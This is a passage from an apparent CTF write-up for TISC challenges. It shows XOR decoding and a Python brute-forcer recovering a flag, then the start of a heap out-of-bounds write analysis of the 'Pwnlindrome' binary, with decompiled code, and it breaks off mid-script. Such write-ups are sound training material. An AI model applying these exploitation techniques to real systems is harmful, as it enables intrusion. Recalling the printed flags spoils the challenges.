</span></span></span></code></pre></div><p>We can see that it tries to <strong>mmap</strong> at an address <code>0x0</code> which gives in an <strong>operation not permitted</strong> error.</p><p>An easy solution to fix this problem is to run our program with root permissions via <code>sudo</code>.</p><pre tabindex=0><code>❯ sudo ./KEEP_THIS_COPY
⣐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣅⡠⠃⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢹⣿⣇⡀⠀⠀⠀⢀⣤⣤⣤⣾⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀
⢸⣿⣿⣷⡀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣶
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⡀⠀⠀⠀⣀⣀⣤⣾
⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠉⠙⠉⠉⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⠟⠋⠁⠀⠀
99da49bf753d923a4e52c0d68c775490
-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
It&#39;s Morbin Time!
abc
Rejoice, my fellow Morbs
</code></pre><p>we see that our program takes in an input and prints something, then exits.</p><p>If we run this program in GDB, and then <em>interrupt</em> the program when it prompts for input <em>(of size 50)</em> via <code>ctrl-c</code>, we will see that our program breaks at our mmap&rsquo;ed address.</p><p>If we step through the assembly code at that point, we see that it xors our input with <code>0x2f</code>.</p><pre tabindex=0><code>→      0x23f                  xor    eax, 0x2f
</code></pre><p>It then makes a comparison between our xored input and another stream of bytes.</p><p>If we xor the stream of bytes with <code>0x2f</code>, we get the following:</p><pre tabindex=0><code>gef➤  xor-memory display $rsi 40 0x2f
[+] Displaying XOR-ing 0x7fffffffb2a0-0x7fffffffb2c8 with &#39;0x2f&#39;
──────────────────────────────────────── Original block ────────────────────────────────────────
0x00007fffffffb2a0     7b 66 7c 6c 54 5b 47 1e 5c 70 1e 5c 70 41 1f 5b    {f|lT[G.\p.\pA.[
0x00007fffffffb2b0     70 5b 47 1c 70 4e 4c 18 5a 1b 43 70 49 43 1b 48    p[G.pNL.Z.CpIC.H
0x00007fffffffb2c0     70 43 62 1b 1f 52 07 97    pCb..R..
───────────────────────────────────────── XOR-ed block ─────────────────────────────────────────
0x00007fffffffb2a0     54 49 53 43 7b 74 68 31 73 5f 31 73 5f 6e 30 74    TISC{th1s_1s_n0t
0x00007fffffffb2b0     5f 74 68 33 5f 61 63 37 75 34 6c 5f 66 6c 34 67    _th3_ac7u4l_fl4g
0x00007fffffffb2c0     5f 6c 4d 34 30 7d 28 b8    _lM40}(.
</code></pre><p><code>TISC{th1s_1s_n0t_th3_ac7u4l_fl4g_lM40}</code> which if we input into the program, gives us a different output with some random trailer bytes.</p><pre tabindex=0><code>❯ sudo ./morbius
⣐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣅⡠⠃⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢹⣿⣇⡀⠀⠀⠀⢀⣤⣤⣤⣾⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀
⢸⣿⣿⣷⡀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣶
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⡀⠀⠀⠀⣀⣀⣤⣾
⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠉⠙⠉⠉⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⠟⠋⠁⠀⠀
6f9f2ae89cefd7e16d19f2dc134c23a9
-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
It&#39;s Morbin Time!
TISC{th1s_1s_n0t_th3_ac7u4l_fl4g_lM40}
Time to get Morbed, é!Uʷp]P,
                            9/R6&lt;ڶ=
</code></pre><p>Running the program a few more times, we can make some observatations:</p><ol><li>We can add 12 more bytes after the fake flag to fill up the 50 bytes of input.</li><li>Depending on the bytes that we add, it will generate a different output each time.</li><li>For the same input, we will always get the same output.</li></ol><p>In order to see how the output was generated, I stepped through many many many many instructions coupled with many jumps, which made me feel sleepy <em>zzZZ</em>.</p><p>However, I did notice that the program extracts some characters from our input such as <code>t</code> and <code>n</code> when stepping through the program.</p><p>After awhile, I decided to try play around with my input. I sent 50 bytes of input to the program</p><pre tabindex=0><code>TISC{th1s_1s_n0t_th3_ac7u4l_fl4g_lM40} + &#34;A&#34;*12
</code></pre><p>and changed one byte at a time to see which character in the trailing 12 characters will affect the output of the program.</p><p>I eventually found that only 2 bytes of the 12 bytes affected the output. Then I figured that perhaps I could brute force these 2 characters to see if we can find our flag in the outputs.</p><p>The code to brute force the program was tricky as the program seems to take in input via stderr, but heres the final script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=c1># coding: utf-8</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>subprocess</span> <span class=kn>import</span> <span class=n>Popen</span><span class=p>,</span> <span class=n>PIPE</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>string</span> <span class=kn>import</span> <span class=n>printable</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#p = process(&#39;./morbius2&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>FAKE_FLAG</span> <span class=o>=</span> <span class=s2>&#34;TISC</span><span class=si>{th1s_1s_n0t_th3_ac7u4l_fl4g_lM40}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>KEY</span> <span class=o>=</span> <span class=s2>&#34;12</span><span class=si>{}</span><span class=s2>12345&#34;</span>
</span></span><span class=line><span class=cl><span class=n>KEY2</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2>123&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>printable</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>printable</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>FINAL_KEY</span> <span class=o>=</span> <span class=n>FAKE_FLAG</span> <span class=o>+</span> <span class=n>KEY</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=o>+</span> <span class=n>KEY2</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=p>,</span> <span class=n>w</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>pipe</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>Popen</span><span class=p>(</span><span class=s1>&#39;./morbius2&#39;</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>r</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>w</span><span class=p>,</span> <span class=n>FINAL_KEY</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>close</span><span class=p>(</span><span class=n>w</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>output</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>communicate</span><span class=p>()[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>close</span><span class=p>(</span><span class=n>r</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;TISC&#39;</span> <span class=ow>in</span> <span class=n>output</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>output</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>FINAL_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span></code></pre></div><p>which found me the flag</p><p><code>TISC{P0lyM0rph15m_r3m1nd5_m3_0f_M0rb1us_7359430}</code></p><h2 id=level-6---pwnlindrome>LEVEL 6 - Pwnlindrome</h2><blockquote><p>Topics: Reverse Engineering, Pwn</p><p>PALINDROME&rsquo;s recruitment operations has resumed once again.</p><p>One of our agents managed to obtain a copy of the .elf binary used in their recruitment operations. Will you be able to pass this test and get us further into their organization?</p><p>The time is ticking. Good luck!</p><p>To access server: nc chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg 64421</p><p>ATTACHED FILES
<a href=attachments/6/pwnlindrome.elf>pwnlindrome.elf</a></p></blockquote><pre tabindex=0><code>❯ file pwnlindrome.elf
pwnlindrome.elf: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b7fdbec2cd351849de3bd47b952c531fd7f71bbb, for GNU/Linux 3.2.0, stripped

❯ checksec pwnlindrome.elf
[*] &#39;/home/elmo/TISC/6/pwnlindrome.elf&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre><pre tabindex=0><code>####################################################################
#                                                                  #
#  \              /  _____         _____  _____   ___ ___   _____  #
#   \            /  |      |      |      |     | |   |   | |       #
#    \    /\    /   |_____ |      |      |     | |   |   | |_____  #
#     \  /  \  /    |      |      |      |     | |   |   | |       #
#      \/    \/     |_____ |_____ |_____ |_____| |   |   | |_____  #
####################################################################

FLOW THROUGH THE LEVELS!

####################################################################
#                             THE MENU                             #
# 1. Access level 1                                                #
# 2. Access level 2                                                #
# 3. Access level 3                                                #
# 4. Menu                                                          #
# 5. Exit                                                          #
####################################################################

Enter your option:
</code></pre><p>We are introduced with a welcome screen with 3 inputs.</p><p>If we look at the source code for level 1,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>level_1</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>v0</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span> <span class=s>&#34;Welcome to level 1!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>v0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v10</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v9</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span> <span class=s>&#34;Please provide a seed: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>seed</span> <span class=o>=</span> <span class=nf>get_signed_integer_input</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nf>srand</span><span class=p>(</span><span class=n>seed</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=n>v10</span><span class=o>++</span><span class=p>;</span>                                <span class=c1>// loop index
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>result</span> <span class=o>=</span> <span class=n>idx</span> <span class=o>&lt;=</span> <span class=mi>15</span><span class=p>;</span>                         <span class=c1>// loop 16 times
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>result</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>random</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>v10</span> <span class=o>&lt;=</span> <span class=mi>16</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>random</span> <span class=o>=</span> <span class=n>random</span> <span class=o>%</span> <span class=mi>256</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v1</span> <span class=o>=</span> <span class=n>v9</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v6</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>level_1_allocations</span> <span class=o>+</span> <span class=n>random</span> <span class=o>+</span> <span class=p>(</span><span class=kr>__int64</span><span class=p>)(</span><span class=n>v1</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=mi>247</span><span class=p>;</span> <span class=c1>// level_1_allocations = malloc(0x1000)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>v2</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span> <span class=s>&#34;Allocation &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>v2</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>v3</span><span class=p>,</span> <span class=s>&#34; - What should I allocate here? &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>v6</span> <span class=o>=</span> <span class=nf>get_signed_integer_input</span><span class=p>();</span>           <span class=c1>// VULNERABLE!! OOB WRITE
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>It takes in a seed from the user, and then take in 16 integer inputs <em>(4 bytes each)</em>. These 16 inputs are stored at a position relative to the start of the <code>level_1_allocations</code> chunk in the heap.</p><p>However, if we notice, we can write up to <code>256 + (15&lt;&lt;8) + 247 = 4343 > 0x1000</code>, which allows us to write beyond the chunk itself <em>(oob write)</em>.</p><p>Now if we look at level 3, it makes a check to see if a certain condition is fulfilled.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=nf>check_if_clear_level_1</span><span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=n>level_1_check</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>1</span> <span class=p>)</span> <span class=c1>// level_1_check = malloc(0x1000)
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v0</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span> <span class=s>&#34;Seems like you haven&#39;t cleared level 1...&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>v0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>check_if_clear_level_1</span><span class=p>(</span><span class=kt>int</span> <span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>i</span><span class=p>;</span> <span class=c1>// [rsp+18h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [rsp+1Ch] [rbp-4h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>a1</span> <span class=o>&lt;=</span> <span class=mi>10</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=nf>sub_555555556429</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>a1</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=nf>sub_555555556466</span><span class=p>(</span><span class=mi>0LL</span><span class=p>);</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=n>a1</span><span class=p>;</span> <span class=n>i</span> <span class=o>=</span> <span class=nf>sub_555555556466</span><span class=p>(</span><span class=n>v2</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>==</span> <span class=n>a1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v2</span> <span class=o>=</span> <span class=n>v4</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>As we can see, a number is passed in from another malloced chunk into the function. And then it does some calculations and return 1 when a certain condition is fulfilled.</p><p>In the interest of time, we will not bother reversing this function to find a valid number. We will just brute force it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdbool.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int64_t</span> <span class=nf>op2</span><span class=p>(</span><span class=kt>int</span> <span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// ebx
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>a1</span> <span class=o>&lt;=</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>a1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v2</span> <span class=o>=</span> <span class=nf>op2</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>1</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>v2</span> <span class=o>+</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=nf>op2</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>2</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>op</span><span class=p>(</span><span class=kt>char</span> <span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=p>((</span><span class=n>a1</span> <span class=o>*</span> <span class=n>a1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int64_t</span> <span class=nf>check_if_clear_level_1</span><span class=p>(</span><span class=kt>int</span> <span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>i</span><span class=p>;</span> <span class=c1>// [rsp+18h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [rsp+1Ch] [rbp-4h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>a1</span> <span class=o>&lt;=</span> <span class=mi>10</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=p>)</span><span class=nf>op</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>a1</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=nf>op2</span><span class=p>(</span><span class=mi>0LL</span><span class=p>);</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=n>a1</span><span class=p>;</span> <span class=n>i</span> <span class=o>=</span> <span class=nf>op2</span><span class=p>(</span><span class=n>v2</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>==</span> <span class=n>a1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v2</span> <span class=o>=</span> <span class=n>v4</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Trying: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nf>check_if_clear_level_1</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
